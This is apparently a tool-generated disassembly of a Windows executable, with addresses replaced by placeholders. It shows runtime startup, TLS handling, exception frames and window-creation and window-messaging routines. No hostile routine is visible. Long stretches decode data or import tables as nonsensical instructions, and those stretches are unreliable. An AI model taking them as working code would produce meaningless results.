mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404c88
call sub_402fac
test al al
je r-xdata
call sub_4030a0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401344
mov [ rw-data ] eax
call sub_40133c
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402fdc
call sub_4012b4
call sub_405c74
mov [ rw-data ] eax
call sub_40133c
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012b4
call sub_405c74
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_401334
mov [ rw-data ] eax
sub_405e44
push ebx
call sub_405e3c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405e30
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403ee0
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403ee0
sub_405e88
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405e44
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405ed4
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405e10
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405ec8
mov edx rw-data
mov eax ebx
call sub_403c34
pop ebx
retn
sub_405f18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f44
retn
sub_405f8c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405fa8
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_405fd4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ff9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406000
retn
sub_40600c
adc [ eax + 0x40 ] ah
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
or al 0x60
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
xchg ebx eax
inc edi
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x1c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg ebx eax
sar bh 0x25
adc al 0x93
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg edx eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg esi eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg esi eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg esi eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x4025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x3025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1c25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x1025ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0xc25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x825ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x425ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx + 0x25ffc0 ] cl
xchg ebp eax
inc edi
add [ ebx - 0x3da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x7da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0xbda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0xfda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x13da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x17da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x1bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x1fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x23da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x27da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x2bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x2fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x33da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x37da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x3bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x3fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x43da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x47da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x4bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x4fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x53da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x57da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x5bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x5fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x63da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x67da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x6bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x6fda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x73da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x77da0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x7bda0040 ] cl
xchg esp eax
inc edi
add [ ebx - 0x7fda0040 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x7025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x6025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5825ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5425ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x5025ffc0 ] cl
xchg esp eax
inc edi
add [ ebx + 0x4c25ffc0 ] cl
xchg esp eax
inc edi
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x2425ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x2025ffc0 ] cl
xchg ebx eax
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
shl [ eax + 0x40 ] 0x0
push es
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x1825ffc0 ] cl
xchg ebx eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg ebx eax
mov eax eax
add ecx [ eax ]
inc eax
add [ ebx + 0x1c25ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x1825ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x1425ffc0 ] cl
xchg edx eax
inc edi
add [ ebx + 0x2825ffc0 ] cl
xchg ebx eax
inc edi
sub_406ae0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_40294c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_40293c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406b38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_40294c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_40293c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406b90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406c85
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406cad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406cb4
retn
sub_406cc0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406ce5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406cec
retn
sub_406cf8
xchg [ fs : edi ] al
[ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
